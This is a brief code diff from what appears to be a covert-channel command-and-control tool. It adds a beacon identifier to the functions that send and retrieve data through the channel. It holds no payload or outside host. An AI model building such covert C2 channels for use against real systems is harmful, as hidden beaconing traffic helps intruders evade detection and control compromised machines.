@@ -47,11 +47,11 @@ def decodeData(data):
 	rdyData = encoder.decode(data)
 	return rdyData
 
-def retrieveData():
+def retrieveData(beaconId):
 	# This will retireve data via the covert channel
 	# Returns unencoded data
 
-	data = transport.retrieveData()
+	data = transport.retrieveData(beaconId)
 
 	if config.debug:
 		print (color("RAW RETRIEVED DATA: ", status=False, yellow=True) + "%s") % (data)
@@ -61,7 +61,7 @@ def retrieveData():
 
 	return preped_data
 
-def sendData(data):
+def sendData(data, beaconId):
 	# This will upload the data via the covert channel
 	# returns a confirmation that the data has been sent
 
@@ -70,7 +70,7 @@ def sendData(data):
 	# Prepares the data to be sent via the covert channel
 	preped_data = prepData(data)
 
-	transport.sendData(preped_data)
+	transport.sendData(preped_data, beaconId)
 
 def color(string, status=True, warning=False, bold=True, yellow=False):
 	"""
